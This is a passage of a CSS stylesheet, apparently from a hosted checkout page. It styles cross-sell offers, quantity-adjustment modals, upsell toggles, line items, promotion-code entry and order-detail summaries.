            border: 1px solid hsla(0, 0%, 100%, 0.1);
        }

        .App-Container.is-darkBackground .CrossSellOffer-header {
            border: 1px solid hsla(0, 0%, 100%, 0.1);
            border-bottom: none;
        }

        .CrossSellOffer.is-loading .CrossSellOffer-container {
            opacity: 0.4;
        }

        @media only screen and (min-width: 992px) {
            .App-Container.is-darkBackground .CrossSellOffer-header,
            .CrossSellOffer-header {
                border: none;
                -webkit-box-pack: center;
                -webkit-justify-content: center;
                -ms-flex-pack: center;
                justify-content: center;
            }

            .CrossSellOffer-container {
                border-top-left-radius: 6px;
                border-top-right-radius: 6px;
            }
        }

        .HeaderImage--logo .HeaderImage-img {
            max-width: 150px;
            max-height: 28px;
            margin-right: 8px;
        }

        .App-Container--setupMode .HeaderImage--logo .HeaderImage-img {
            max-height: 35px;
        }

        .HeaderImage--icon {
            height: 28px;
            width: 28px;
            margin-right: 8px;
            box-shadow: 0 2px 5px 0 rgba(50, 50, 93, 0.1), 0 1px 1px 0 rgba(0, 0, 0, 0.07);
            border-radius: 100%;
            background: #fff;
        }

        .HeaderImage--iconFallback {
            background: #fff;
        }

        .HeaderImage-imageIcon {
            height: 100%;
            width: 100%;
            border-radius: 100%;
            -o-object-fit: cover;
            object-fit: cover;
        }

        .HeaderImage-fallbackIcon {
            fill: rgba(26, 26, 26, 0.5);
        }

        @media only screen and (min-width: 992px) {
            .App-Container:not(.App-Container--setupMode) .HeaderImage--logo img {
                max-height: 28px;
                max-width: 300px;
            }
        }

        .AdjustQuantityFooter {
            margin: 16px 20px;
            height: 48px;
            overflow-x: hidden;
            position: relative;
        }

        .AdjustQuantityFooter-btnContainer {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            opacity: 1;
            width: 50%;
            position: absolute;
            overflow-x: hidden;
            padding: 4px;
        }

        .AdjustQuantityFooter-btn {
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            height: 38px;
            position: relative;
        }

        .AdjustQuantityFooter-btn .Button-Icon.Button-Spinner {
            margin-right: 0;
        }

        .AdjustQuantityFooter-btn svg {
            position: absolute;
            right: 12px;
        }

        .AdjustQuantityFooter-btn .Button--secondary {
            height: 39px;
        }

        .AdjustQuantityFooter-btn--gray:not(:disabled):hover {
            background-color: rgba(26, 26, 26, 0.05);
        }

        .AdjustQuantityFooter-btn,
        .AdjustQuantityFooter-btn .Text {
            transition: all 0.2s ease;
        }

        .AdjustQuantityFooter-btn:disabled .Text {
            opacity: 0.6;
        }

        .AdjustQuantityModal-modal.has-notice .AdjustQuantityFooter {
            margin-top: 8px;
        }

        .AdjustQuantityHeader-header {
            border-bottom: 1px solid rgba(26, 26, 26, 0.1);
            padding: 16px 20px;
        }

        .AdjustQuantityHeader-closeBtn {
            padding: 8px;
            border-radius: 20px;
        }

        .AdjustQuantityHeader-imageContainer {
            width: 32px;
            height: 32px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            position: relative;
        }

        .AdjustQuantityHeader-image {
            max-width: 100%;
            max-height: 100%;
            border-radius: 4px;
        }

        .App-Container.is-squareBordered .AdjustQuantityHeader-image,
        .ModalContent--is-squareBordered .AdjustQuantityHeader-image {
            border-radius: 0;
        }

        .App-Container.is-veryRoundBordered .AdjustQuantityHeader-image,
        .ModalContent--is-veryRoundBordered .AdjustQuantityHeader-image {
            border-radius: 18px;
        }

        .AdjustQuantityHeader-closeBtn:focus {
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
            outline: none;
        }

        .AdjustQuantityHeader-closeBtn .Button-Icon {
            margin-right: 0;
        }

        .AdjustQuantityModal-modal {
            width: 356px;
        }

        .AdjustQuantityModal-content {
            padding: 16px 20px;
        }

        .AdjustQuantityModal-modal.is-removing .AdjustQuantityModal-quantity {
            background-color: #dc2727;
        }

        .AdjustQuantityModal-content {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            padding: 24px 20px 16px;
            overflow-y: hidden;
        }

        .AdjustQuantityModal-toggleQuantityBtn {
            padding: 8px;
            background-color: rgba(0, 0, 0, 0.03);
            border-radius: 20px;
            margin-right: 16px;
            margin-left: 16px;
            transition: opacity 0.1s ease-in, background-color 0.1s ease-in, -webkit-transform 0.08s ease-in;
            transition: opacity 0.1s ease-in, background-color 0.1s ease-in, transform 0.08s ease-in;
            transition: opacity 0.1s ease-in, background-color 0.1s ease-in, transform 0.08s ease-in, -webkit-transform 0.08s ease-in;
        }

        .AdjustQuantityModal-toggleQuantityBtn:active {
            -webkit-transform: scale(0.98);
            -ms-transform: scale(0.98);
            transform: scale(0.98);
        }

        .AdjustQuantityModal-toggleQuantityBtn:focus {
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
            outline: none;
        }

        .AdjustQuantityModal-toggleQuantityBtn:not(.is-disabled):hover {
            background-color: rgba(0, 0, 0, 0.1);
        }

        .AdjustQuantityModal-toggleQuantityBtn.is-disabled {
            opacity: 0.5;
            -webkit-transform: none;
            -ms-transform: none;
            transform: none;
        }

        .AdjustQuantityModal-toggleQuantityBtn.is-cursorDisabled {
            cursor: not-allowed;
        }

        .AdjustQuantityModal-toggleQuantityBtn .Button-Icon {
            margin-right: 0;
        }

        .AdjustQuantityModal-input {
            width: 56px;
            text-align: center;
            border-radius: 6px;
        }

        .AdjustQuantityModal-notice {
            margin-top: 20px;
        }

        @media only screen and (max-width: 991.98px) {
            .AdjustQuantityModal-modal {
                -webkit-align-self: flex-end;
                -ms-flex-item-align: end;
                align-self: flex-end;
                width: 100%;
                -webkit-transform: translateY(60%);
                -ms-transform: translateY(60%);
                transform: translateY(60%);
                border-bottom-left-radius: 0;
                border-bottom-right-radius: 0;
            }

            .AdjustQuantityModal-modalOverlay:before {
                -webkit-filter: blur(0);
                filter: blur(0);
            }

            .AdjustQuantityModal-modalOverlay.ModalOverlay--afterOpen:before {
                opacity: 1;
            }

            .AdjustQuantityModal-modal.ModalContent--afterOpen {
                -webkit-transform: translateY(0);
                -ms-transform: translateY(0);
                transform: translateY(0);
            }

            .AdjustQuantityModal-modal.ModalContent--beforeClose {
                -webkit-transform: translateY(100%);
                -ms-transform: translateY(100%);
                transform: translateY(100%);
            }

            .AdjustQuantityModal-modalOverlay.ModalOverlay--beforeClose:before {
                opacity: 0;
                transition-duration: 0.25s;
            }

            .AdjustQuantityModal-modalOverlay.ModalOverlay--beforeClose {
                -webkit-transform: none;
                -ms-transform: none;
                transform: none;
                opacity: 1;
            }
        }

        .TierDetail-tierBreakdown {
            margin-left: 12px;
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
        }

        .TierDetail-tierDescription--indented {
            margin-left: 12px;
        }

        .TierAccordion-button {
            fill: rgba(26, 26, 26, 0.5);
        }

        .TierAccordion-button .Button-Icon--right {
            margin-left: 4px;
        }

        .App-Overview.is-darkBackground .TierAccordion-button {
            fill: hsla(0, 0%, 100%, 0.5);
        }

        .SavingsBadge {
            background-color: #cbf4c9;
            border-radius: 4px;
            color: #0e6245;
            padding: 1px 6px;
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
        }

        .HostedSwitch {
            display: block;
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            position: relative;
            width: 1.75em;
            height: 1em;
            padding: 0;
            border: 1px solid rgba(0, 0, 0, 0.1);
            border-radius: 1.25em;
            transition: border 0.3s ease, background 0.3s ease, box-shadow 0.3s ease;
            cursor: pointer;
            background: hsla(0, 0%, 100%, 0.5);
        }

        .HostedSwitch:focus {
            outline: none;
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
        }

        .HostedSwitch--active {
            background-color: #24b47e;
        }

        .HostedSwitch--disabled {
            opacity: 0.4;
            cursor: default;
        }

        .HostedSwitchControl {
            display: block;
            width: auto;
            height: 100%;
            fill: #fff;
            border-radius: 100%;
            -webkit-transform: translate(0);
            -ms-transform: translate(0);
            transform: translate(0);
            transition: -webkit-transform 0.3s ease;
            transition: transform 0.3s ease;
            transition: transform 0.3s ease, -webkit-transform 0.3s ease;
            will-change: transform;
            border: 1px solid rgba(42, 47, 69, 0.12);
        }

        .HostedSwitch--active .HostedSwitchControl {
            -webkit-transform: translate(0.75em);
            -ms-transform: translate(0.75em);
            transform: translate(0.75em);
        }

        .UpsellToggle-clickContainer {
            position: relative;
            border-bottom-left-radius: 6px;
            border-bottom-right-radius: 6px;
            z-index: 0;
            border: 1px solid rgba(26, 26, 26, 0.1);
        }

        .UpsellToggle,
        .UpsellToggle-clickContainer {
            min-height: 44px;
        }

        .UpsellToggle-clickContainer:before {
            content: "";
            top: -1px;
            left: -1px;
            position: absolute;
            height: calc(100% + 2px);
            width: calc(100% + 2px);
            background: linear-gradient(90deg, hsla(0, 0%, 100%, 0) 35%, #24b47e 50%, hsla(0, 0%, 100%, 0) 65%);
            border-bottom-right-radius: 7px;
            border-bottom-left-radius: 7px;
            z-index: 1;
            background-size: 300% 300%;
            background-position: 100%;
        }

        .UpsellToggle-clickContainer.animate-shimmer:before {
            -webkit-animation: shimmer 1.25s ease;
            animation: shimmer 1.25s ease;
        }

        .UpsellToggle-backgroundContainer {
            border-bottom-left-radius: 6px;
            border-bottom-right-radius: 6px;
            position: relative;
            height: 100%;
            width: 100%;
            z-index: 1;
        }

        .UpsellToggle {
            padding: 12px 16px;
            border-radius: 5px;
            background-color: rgba(26, 26, 26, 0.05);
            margin-top: 16px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
        }

        .UpsellToggle-savingsMessage {
            margin-right: 8px;
            display: inline-block;
            vertical-align: middle;
        }

        .UpsellToggle .UpsellToggle-savingsMessageText {
            margin-right: 4px;
        }

        .UpsellToggle .SavingsBadge {
            margin-top: 1px;
        }

        .UpsellToggle-clickContainer:not(.is-renderedOnLineItem) .UpsellToggle {
            max-width: 380px;
            margin: 0 auto;
        }

        .UpsellToggle-price {
            text-align: end;
            -webkit-align-self: center;
            -ms-flex-item-align: center;
            -ms-grid-row-align: center;
            align-self: center;
        }

        @media only screen and (max-width: 991.98px) {
            .UpsellToggle-clickContainer {
                border-radius: 6px;
            }

            .UpsellToggle-clickContainer:before {
                border-radius: 7px;
            }

            .UpsellToggle-backgroundContainer {
                border-radius: 6px;
            }

            .UpsellToggle-clickContainer.is-renderedOnLineItem {
                display: none;
            }
        }

        @media only screen and (min-width: 992px) {
            .UpsellToggle {
                border-radius: 0;
                border-bottom-left-radius: 5px;
                border-bottom-right-radius: 5px;
                margin-top: 0;
            }

            .UpsellToggle-clickContainer {
                display: none;
            }

            .UpsellToggle-clickContainer.is-renderedOnLineItem {
                display: -webkit-box;
                display: -webkit-flex;
                display: -ms-flexbox;
                display: flex;
            }
        }

        .App-Container.is-darkBackground .UpsellToggle-clickContainer {
            border: 1px solid hsla(0, 0%, 100%, 0.1);
        }

        .App-Container.is-darkBackground .UpsellToggle {
            background-color: hsla(0, 0%, 100%, 0.05);
        }

        @media only screen and (min-width: 992px) {
            .App-Container.is-darkBackground .UpsellToggle-clickContainer {
                border: 1px solid hsla(0, 0%, 100%, 0.1);
            }
        }

        @-webkit-keyframes shimmer {
            0% {
                background-position: 95%;
            }
            to {
                background-position: 0;
            }
        }

        @keyframes shimmer {
            0% {
                background-position: 95%;
            }
            to {
                background-position: 0;
            }
        }

        .LineItem-imageContainer {
            width: 42px;
            height: 42px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
        }

        .LineItem-image {
            max-width: 100%;
            max-height: 100%;
            border-radius: 4px;
        }

        .App-Container.is-squareBordered .LineItem-image {
            border-radius: 0;
        }

        .App-Container.is-veryRoundBordered .LineItem-image {
            border-radius: 18px;
        }

        .LineItem--indented {
            margin-left: 58px;
        }

        .LineItem-tierAccordion,
        .LineItem-tierBreakdown {
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
        }

        .LineItem-tierBreakdown {
            margin-left: 12px;
        }

        .LineItem--isMobile .LineItem-adjustableQtyHitBox {
            padding: 8px;
            margin: -8px;
        }

        .LineItem-adjustableQtyHitBox {
            display: inline-block;
        }

        .LineItem-adjustableQty {
            margin: 0 2px;
            padding: 1px 4px;
            border-radius: 4px;
        }

        .LineItem-adjustableQty,
        .LineItem-adjustableQty .LineItem-adjustableQtyIcon {
            transition: all 0.15s ease-in;
        }

        .LineItem-adjustableQty:hover {
            background-color: rgba(0, 0, 0, 0.05);
        }

        .LineItem-adjustableQty:active {
            background-color: rgba(0, 0, 0, 0.1);
        }

        .LineItem-adjustableQty:hover .LineItem-adjustableQtyIcon {
            fill: #1a1a1a;
        }

        @media only screen and (min-width: 992px) {
            .LineItem.is-upsell {
                padding: 16px;
                border-top-left-radius: 6px;
                border-top-right-radius: 6px;
                border: 1px solid rgba(26, 26, 26, 0.1);
                border-bottom: none;
            }

            .LineItem--indented.is-upsell {
                margin-left: 0;
                padding-left: 74px;
            }
        }

        .App-Overview.is-darkBackground .LineItem-adjustableQtyIcon {
            fill: hsla(0, 0%, 100%, 0.5);
        }

        .App-Overview.is-darkBackground .LineItem-adjustableQty:hover {
            background-color: hsla(0, 0%, 100%, 0.09);
        }

        .App-Overview.is-darkBackground .LineItem-adjustableQty:active {
            background-color: hsla(0, 0%, 100%, 0.14);
        }

        @media only screen and (min-width: 992px) {
            .App-Overview.is-darkBackground .LineItem.is-upsell {
                border: 1px solid hsla(0, 0%, 100%, 0.1);
                border-bottom: none;
            }
        }

        .PromotionCodeEntry {
            margin-bottom: 16px;
            font-size: 14px;
        }

        .PromotionCodeEntry-inputWrapper {
            position: relative;
            display: inline-block;
            min-width: 100%;
        }

        .PromotionCodeEntry-inputWrapper--blurred {
            min-width: 45%;
            transition-property: min-width;
        }

        .PromotionCodeEntry-inputWrapper + .Text {
            display: block;
            margin-top: 4px;
        }

        .PromotionCodeEntry-label {
            font-size: 14px;
            font-weight: 500;
            padding: 0;
            white-space: nowrap;
            height: 0;
            visibility: hidden;
            transition-property: padding;
        }

        .PromotionCodeEntry-inputWrapper--focused .PromotionCodeEntry-label {
            padding: 0 12px;
        }

        .PromotionCodeEntry .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input {
            border-radius: 6px;
            padding: 0;
            line-height: 1.5;
            transition-property: padding, line-height, background, box-shadow;
            font-size: 14px;
            height: 36px;
        }

        .ModalContent--is-veryRoundBordered .PromotionCodeEntry .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input {
            border-radius: 18px;
        }

        .ModalContent--is-squareBordered .PromotionCodeEntry .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input {
            border-radius: 0;
        }

        .PromotionCodeEntry .PromotionCodeEntry-inputWrapper--focused .PromotionCodeEntry-input {
            padding: 8px 90px 8px 12px;
        }

        .App-Container:not(.is-noBackground) .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-label {
            padding: 0 12px;
        }

        .App-Container.is-noBackground .PromotionCodeEntry .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input {
            height: auto;
        }

        .App-Container:not(.is-noBackground) .PromotionCodeEntry .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input,
        .PromotionCodeEntry .PromotionCodeEntry-inputWrapper--focused .PromotionCodeEntry-input[value=""] {
            padding: 8px 12px;
        }

        .PromotionCodeEntry .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input {
            background-color: transparent;
            box-shadow: none;
            cursor: pointer;
            line-height: 1.3;
        }

        .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input::-webkit-input-placeholder {
            font-weight: 500;
            color: #0074d4;
        }

        .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input::-moz-placeholder {
            font-weight: 500;
            color: #0074d4;
        }

        .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input:-ms-input-placeholder {
            font-weight: 500;
            color: #0074d4;
        }

        .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input::placeholder {
            font-weight: 500;
            color: #0074d4;
        }

        .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input::-webkit-input-placeholder {
            transition-property: color;
            opacity: 1;
        }

        .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input::-moz-placeholder {
            transition-property: color;
            opacity: 1;
        }

        .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input:-ms-input-placeholder {
            transition-property: color;
            opacity: 1;
        }

        .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input::placeholder {
            transition-property: color;
            opacity: 1;
        }

        .PromotionCodeEntry-inputWrapper,
        .PromotionCodeEntry-inputWrapper .InputContainer,
        .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input::-webkit-input-placeholder,
        .PromotionCodeEntry-label,
        .PromotionCodeEntry .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input {
            transition-timing-function: ease-out;
            transition-duration: 0.2s;
        }

        .PromotionCodeEntry-inputWrapper,
        .PromotionCodeEntry-inputWrapper .InputContainer,
        .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input::-moz-placeholder,
        .PromotionCodeEntry-label,
        .PromotionCodeEntry .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input {
            transition-timing-function: ease-out;
            transition-duration: 0.2s;
        }

        .PromotionCodeEntry-inputWrapper,
        .PromotionCodeEntry-inputWrapper .InputContainer,
        .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input:-ms-input-placeholder,
        .PromotionCodeEntry-label,
        .PromotionCodeEntry .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input {
            transition-timing-function: ease-out;
            transition-duration: 0.2s;
        }

        .PromotionCodeEntry-inputWrapper,
        .PromotionCodeEntry-inputWrapper .InputContainer,
        .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input::placeholder,
        .PromotionCodeEntry-label,
        .PromotionCodeEntry .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input {
            transition-timing-function: ease-out;
            transition-duration: 0.2s;
        }

        .PromotionCodeEntry-applyButton {
            position: absolute;
            top: 0;
            bottom: 0;
            right: 12px;
            background: transparent;
            border: none;
            opacity: 0;
            -webkit-transform: scale(0.8);
            -ms-transform: scale(0.8);
            transform: scale(0.8);
            transition: opacity 0.3s ease, -webkit-transform 0.3s ease;
            transition: opacity 0.3s ease, transform 0.3s ease;
            transition: opacity 0.3s ease, transform 0.3s ease, -webkit-transform 0.3s ease;
            pointer-events: none;
            z-index: 100;
        }

        .PromotionCodeEntry-applyButton--visible {
            opacity: 1;
            -webkit-transform: scale(1);
            -ms-transform: scale(1);
            transform: scale(1);
            pointer-events: auto;
            cursor: pointer;
        }

        .App-Container:not(.is-noBackground) .PromotionCodeEntry .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input {
            box-shadow: none;
            border: 0;
        }

        .PromotionCodeEntry-applyButton--error {
            transition: none;
        }

        .PromotionCodeEntry .Button-Icon path {
            fill: #1a1a1a;
        }

        .PromotionCodeEntry .Button-Spinner {
            opacity: 1;
        }

        .App-Overview.is-darkBackground .PromotionCodeEntry .Button-Icon path {
            fill: #fff;
        }

        .is-darkMode .OrderDetailsDropdown .PromotionCodeEntry-input.Input {
            background: transparent;
        }

        .is-darkMode .PromotionCodeEntry .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input:focus {
            background-color: #fff;
            color: rgba(26, 26, 26, 0.9);
        }

        .App-Container:not(.is-noBackground) .PromotionCodeEntry .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input {
            border: none;
            box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
        }

        .App-Overview.is-darkBackground .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input::-webkit-input-placeholder {
            color: rgba(26, 26, 26, 0.9);
        }

        .App-Overview.is-darkBackground .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input::-moz-placeholder {
            color: rgba(26, 26, 26, 0.9);
        }

        .App-Overview.is-darkBackground .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input:-ms-input-placeholder {
            color: rgba(26, 26, 26, 0.9);
        }

        .App-Overview.is-darkBackground .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input::placeholder {
            color: rgba(26, 26, 26, 0.9);
        }

        .App-Container:not(.is-noBackground) .PromotionCodeEntry .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input:focus {
            box-shadow: 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(0, 0, 0, 0.1);
        }

        .App-Overview.is-darkBackground .PromotionCodeEntry .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input:focus {
            box-shadow: 0 1px 1px 0 hsla(0, 0%, 100%, 0.07), 0 0 0 4px hsla(0, 0%, 100%, 0.3);
        }

        .App-Container:not(.is-noBackground) .PromotionCodeEntry .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input {
            background-color: rgba(26, 26, 26, 0.05);
            box-shadow: none;
        }

        .App-Container:not(.is-noBackground) .PromotionCodeEntry .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input:hover {
            background-color: rgba(26, 26, 26, 0.1);
        }

        .App-Container:not(.is-noBackground) .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input::-webkit-input-placeholder {
            color: rgba(26, 26, 26, 0.9) !important;
        }

        .App-Container:not(.is-noBackground) .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input::-moz-placeholder {
            color: rgba(26, 26, 26, 0.9) !important;
        }

        .App-Container:not(.is-noBackground) .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input:-ms-input-placeholder {
            color: rgba(26, 26, 26, 0.9) !important;
        }

        .App-Container:not(.is-noBackground) .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input::placeholder {
            color: rgba(26, 26, 26, 0.9) !important;
        }

        .App-Overview.is-darkBackground .PromotionCodeEntry .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input {
            background-color: hsla(0, 0%, 100%, 0.05);
            transition: background 0.08s ease;
        }

        .App-Overview.is-darkBackground .PromotionCodeEntry .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input:hover {
            background-color: hsla(0, 0%, 100%, 0.1);
        }

        .App-Overview.is-darkBackground .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input::-webkit-input-placeholder {
            color: #fff !important;
        }

        .App-Overview.is-darkBackground .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input::-moz-placeholder {
            color: #fff !important;
        }

        .App-Overview.is-darkBackground .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input:-ms-input-placeholder {
            color: #fff !important;
        }

        .App-Overview.is-darkBackground .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input::placeholder {
            color: #fff !important;
        }

        .App-Overview.is-darkBackground .PromotionCodeEntry-applyButton .Text-color--default {
            color: inherit;
        }

        .PromotionCodeEntry .PromotionCodeEntry-inputWrapper .PromotionCodeEntry-input + .InputContainer-placeholder--ie {
            font-size: 14px;
            white-space: nowrap;
        }

        .App-Container.is-noBackground .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input + .InputContainer-placeholder--ie {
            top: 0;
            left: 0;
        }

        .PromotionCodeEntry .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input + .InputContainer-placeholder--ie {
            font-size: 14px;
            font-weight: 500;
            color: #0074d4;
        }

        .App-Container:not(.is-noBackground) .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input + .InputContainer-placeholder--ie {
            color: rgba(26, 26, 26, 0.9) !important;
        }

        .App-Overview.is-darkBackground .PromotionCodeEntry-inputWrapper--blurred .PromotionCodeEntry-input + .InputContainer-placeholder--ie {
            color: #fff !important;
        }

        .Placeholder {
            opacity: 1;
        }

        .Placeholder--animating {
            color: transparent;
            position: relative;
            background-color: rgba(0, 0, 0, 0.075);
            border-radius: 4px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.025);
            overflow: hidden;
            height: -webkit-fit-content;
            height: -moz-fit-content;
            height: fit-content;
        }

        .Placeholder--animating:after {
            height: 100%;
            width: 800%;
            display: block;
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            -webkit-transform: translateX(-100%);
            -ms-transform: translateX(-100%);
            transform: translateX(-100%);
            background: radial-gradient(circle at 80% -20%, hsla(0, 0%, 100%, 0.6) 0, hsla(0, 0%, 100%, 0) 20%, hsla(0, 0%, 100%, 0) 100%),
            radial-gradient(circle at 50% 150%, hsla(0, 0%, 100%, 0.6) 0, hsla(0, 0%, 100%, 0) 50%, hsla(0, 0%, 100%, 0) 100%),
            radial-gradient(circle at 20% -20%, hsla(0, 0%, 100%, 0.6) 0, hsla(0, 0%, 100%, 0) 20%, hsla(0, 0%, 100%, 0) 100%);
            -webkit-animation: transition 1.5s infinite;
            animation: transition 1.5s infinite;
            -webkit-animation-timing-function: linear;
            animation-timing-function: linear;
        }

        @-webkit-keyframes transition {
            0% {
                -webkit-transform: translateX(-100%);
                transform: translateX(-100%);
            }
            to {
                -webkit-transform: translateX(10%);
                transform: translateX(10%);
            }
        }

        @keyframes transition {
            0% {
                -webkit-transform: translateX(-100%);
                transform: translateX(-100%);
            }
            to {
                -webkit-transform: translateX(10%);
                transform: translateX(10%);
            }
        }

        .OrderDetailsSubtotalItem {
            margin-bottom: 16px;
        }

        .OrderDetailsSubtotalItem-tooltip {
            z-index: 16;
        }

        .OrderDetailsSubtotalItem .Tooltip-Context {
            margin-left: 4px;
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-transform: translateY(2px);
            -ms-transform: translateY(2px);
            transform: translateY(2px);
        }

        .OrderDetailsFooter-subtotal {
            padding-top: 16px;
            padding-bottom: 16px;
            border-bottom: 1px solid rgba(26, 26, 26, 0.1);
            margin-bottom: 16px;
        }

        .OrderDetailsFooter-subtotal--indented,
        .OrderDetailsFooter-trialTotal--indented {
            margin-left: 58px;
        }

        .OrderDetailsFooter-subtotalItems {
            border-bottom: 1px solid rgba(26, 26, 26, 0.1);
            margin-bottom: 16px;
        }

        .OrderDetailsFooter-subtotalItems--indented {
            margin-left: 58px;
        }

        .App-Overview.is-darkBackground .OrderDetailsFooter-subtotal,
        .App-Overview.is-darkBackground .OrderDetailsFooter-subtotalItems {
            border-bottom: 1px solid hsla(0, 0%, 100%, 0.1);
        }

        .OrderDetails-items {
            list-style: none;
            padding: 0;
            margin: 0;
        }

        .OrderDetails-item {
            margin-bottom: 16px;
        }

        .OrderDetails-total {
            padding-bottom: 16px;
        }

        .OrderDetails-total--indented {
            margin-left: 58px;
        }

        .OrderDetails-showHideButton {
            margin-top: -8px;
        }

        .OrderDetails-showHideButton--indented {
            margin-left: 58px;
        }

        .OrderDetails-showHideButton + .OrderDetails-total {
            margin-top: 16px;
        }

        .OrderDetails-showHideButton .Text {
            position: relative;
            font-size: 14px;
            line-height: 16px;
        }

        .OrderDetails-remainingProductImages {
            position: relative;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            width: 42px;
            height: 42px;
            transition: opacity 0.2s ease;
        }

        .OrderDetails-remainingProductImages.is-hidden {
            opacity: 0;
            pointer-events: none;
        }

        .OrderDetails-remainingProductImageContainer {
            position: absolute;
            width: 20px;
            height: 20px;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            background-color: #fff;
            border-radius: 4px;
            box-shadow: 0 0 0 2px #fff;
        }

        .OrderDetails-remainingProductImageContainer,
        .OrderDetails-remainingProductImages.has-oneImage {
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
        }

        .OrderDetails-remainingProductImages.has-twoImages .OrderDetails-remainingProductImageContainer:first-child {
            z-index: 2;
            left: 0;
        }

        .OrderDetails-remainingProductImages.has-twoImages .OrderDetails-remainingProductImageContainer:nth-child(2) {
            z-index: 1;
            left: 22px;
        }

        .OrderDetails-remainingProductImages.has-threeImages .OrderDetails-remainingProductImageContainer:first-child {
            z-index: 3;
            left: 0;
        }

        .OrderDetails-remainingProductImages.has-threeImages .OrderDetails-remainingProductImageContainer:nth-child(2) {
            z-index: 2;
            left: 11px;
        }

